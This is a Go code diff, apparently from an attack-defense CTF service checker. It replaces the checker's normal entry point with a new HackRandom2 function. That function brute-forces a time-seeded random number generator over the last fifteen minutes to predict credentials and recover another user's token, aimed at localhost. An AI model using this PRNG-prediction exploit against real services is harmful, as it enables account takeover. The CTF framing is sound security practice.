@@ -4,7 +4,6 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"errors"
-	"flag"
 	"fmt"
 	"github.com/gocolly/colly"
 	log "github.com/sirupsen/logrus"
@@ -68,26 +67,64 @@ func (e Endpoints) GetWebUrl() string {
 }
 
 func main() {
-	rand.Seed(time.Now().UnixMilli())
-	addr := flag.String("addr", "", "backend url")
-	command := flag.String("command", "", "command : check, put1, put2, get1, get2")
-	data := flag.String("data", "", "data string")
-	flag.Parse()
-
-	v := Run(addr, command, data)
-	fmt.Println(fmt.Sprintf("VERDICT_CODE:%d", v.Code))
-	fmt.Println(fmt.Sprintf("VERDICT_REASON:%s", v.Reason))
+	//rand.Seed(time.Now().UnixMilli())
+	//addr := flag.String("addr", "", "backend url")
+	//command := flag.String("command", "", "command : check, put1, put2, get1, get2")
+	//data := flag.String("data", "", "data string")
+	//flag.Parse()
+	//
+	//v := Run(addr, command, data)
+	//fmt.Println(fmt.Sprintf("VERDICT_CODE:%d", v.Code))
+	//fmt.Println(fmt.Sprintf("VERDICT_REASON:%s", v.Reason))
 	//Test()
 	//err := HackPT("127.0.0.1")
 	//if err != nil {
 	//	log.Error(err)
 	//	return
 	//}
-	//err := HackRandom("127.0.0.1")
-	//if err != nil {
-	//	log.Error(err)
-	//	return
-	//}
+	err := HackRandom2("127.0.0.1")
+	if err != nil {
+		log.Error(err)
+		return
+	}
+}
+
+func HackRandom2(addr string) error {
+	endpoints := GetEndpoint(&addr)
+	now := time.Now()
+	tokenKey, token, err := CreateUser(endpoints.GetWebUrl())
+	if err != nil {
+		return err
+	}
+	for i := time.Now().Add(-15 * time.Minute); !i.After(now); i = i.Add(time.Second) {
+		rand.Seed(-1)
+		rand.Seed(i.Unix())
+		lastb := make([]byte, 8)
+		binary.LittleEndian.PutUint64(lastb, rand.Uint64())
+		first := hex.EncodeToString(lastb)
+		for j := 0; j < 5; j++ {
+			nextb := make([]byte, 8)
+			binary.LittleEndian.PutUint64(nextb, rand.Uint64())
+			second := hex.EncodeToString(nextb)
+			aclient := api.NewClient(endpoints.GetCPUrl(), second, first)
+			_, err := aclient.CreateUser()
+			if err == nil {
+				log.Info("User created")
+				user, err := aclient.GetUser(tokenKey)
+				if err != nil {
+					return err
+				}
+				if hex.EncodeToString(user.Token) == token {
+					log.Info("Done")
+					return nil
+				}
+				return nil
+			}
+			first = second
+		}
+	}
+
+	return error(NewVerdict(MUMBLE, "Something wrong"))
 }
 
 func HackRandom(addr string) error {
@@ -132,6 +169,7 @@ func HackRandom(addr string) error {
 
 	return error(NewVerdict(MUMBLE, "Something wrong"))
 }
+
 func HackPT(addr string) error {
 	endpoints := GetEndpoint(&addr)
 	tokenKey, token, err := CreateUser(endpoints.GetWebUrl())
